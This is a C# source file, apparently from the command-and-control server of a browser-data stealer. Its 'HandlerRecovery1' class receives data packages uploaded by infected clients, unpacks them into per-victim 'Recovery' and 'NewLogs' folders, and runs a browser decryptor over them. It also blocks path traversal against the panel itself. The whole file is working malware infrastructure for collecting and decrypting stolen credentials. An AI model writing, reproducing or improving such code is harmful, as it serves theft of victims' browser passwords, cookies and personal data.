using System;
using System.Drawing;
using System.IO;
using Server.Connectings;
using Server.Helper;

namespace Server.Messages
{
    internal class HandlerRecovery1
    {
        public static void Read(Clients clients, object[] array)
        {
            if (array.Length < 3) return;

            string clientId = array[1] as string ?? "";
            byte[] data = array[2] as byte[];

            if (string.IsNullOrEmpty(clientId) ||
                clientId.Contains("..") ||
                clientId.Contains("\\") ||
                clientId.Contains("/") ||
                clientId.Contains(":") ||
                string.IsNullOrWhiteSpace(clientId))
            {
                Methods.AppendLogs(clients.IP, "RCE ATTEMPT (Recovery1 traversal)", Color.Red);
                clients.Disconnect();
                return;
            }

            string recoveryDir = Path.GetFullPath(Path.Combine("Users", clientId, "Recovery"));
            string newLogsDir = Path.GetFullPath(Path.Combine("NewLogs", clientId));

            if (!recoveryDir.StartsWith(Path.GetFullPath("Users\\"), StringComparison.OrdinalIgnoreCase) ||
                !newLogsDir.StartsWith(Path.GetFullPath("NewLogs\\"), StringComparison.OrdinalIgnoreCase))
            {
                Methods.AppendLogs(clients.IP, "RCE ATTEMPT (Recovery1 escape)", Color.Red);
                clients.Disconnect();
                return;
            }

            if (data == null || data.Length == 0)
            {
                clients.Disconnect();
                return;
            }

            try
            {
                Directory.CreateDirectory(recoveryDir);
                Directory.CreateDirectory(newLogsDir);

                PaleFileProtocol.Unpack(recoveryDir, data);
                PaleFileProtocol.Unpack(newLogsDir, data);

                DecryptorBrowsers.Start(recoveryDir);
                DecryptorBrowsers.Start(newLogsDir);

                string infoPath = Path.Combine("Users", clientId, "Information.txt");
                if (File.Exists(infoPath))
                {
                    File.Copy(infoPath, Path.Combine(recoveryDir, "InformationLeb.txt"), true);
                    File.Copy(infoPath, Path.Combine(newLogsDir, "InformationLeb.txt"), true);
                }

                Methods.AppendLogs(clients.IP, "Save logs in: Users\\" + clientId + "\\Recovery", Color.MediumPurple);
            }
            catch { }
            finally
            {
                clients.Disconnect();
            }
        }
    }
}
